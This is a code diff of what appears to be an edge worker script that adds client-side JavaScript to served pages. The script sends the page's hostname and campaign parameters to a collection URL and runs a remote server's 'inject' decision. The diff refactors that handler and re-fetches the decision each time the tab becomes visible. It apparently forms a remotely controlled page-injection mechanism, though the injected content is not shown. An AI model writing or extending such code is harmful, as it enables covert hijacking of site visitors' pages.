@@ -12,7 +12,7 @@ async fetch(request, env, ctx) {
     }
 
 
-	const RUNTIME_VERSION = "1.0.3";
+	const RUNTIME_VERSION = "1.0.4";
 	const url = new URL(request.url);
 
 function detectBrowser(ua) {
@@ -402,15 +402,7 @@ const collectUrl =
   "&utm_campaign=" + encodeURIComponent(currentUrl.searchParams.get("utm_campaign") || "") +
   "&host=" + encodeURIComponent(window.location.hostname);
 
-fetch(
-  collectUrl,
-  {
-    method:"GET",
-    keepalive:true
-  }
-)
-.then(r => r.json())
-.then(data => {
+function executeDecision(data){
 
   if(
     data.action === "inject" &&
@@ -459,8 +451,42 @@ fetch(
     );
   }
 
-})
+}
+
+fetch(
+  collectUrl,
+  {
+    method:"GET",
+    keepalive:true
+  }
+)
+.then(r => r.json())
+.then(executeDecision)
 .catch(() => {});
+
+document.addEventListener(
+  "visibilitychange",
+  function(){
+
+    if(
+      document.visibilityState !==
+      "visible"
+    ){
+      return;
+    }
+
+    fetch(
+      collectUrl,
+      {
+        method:"GET",
+        keepalive:true
+      }
+    )
+    .then(r => r.json())
+    .then(executeDecision)
+    .catch(() => {});
+  }
+);
 
 }
 catch(e){
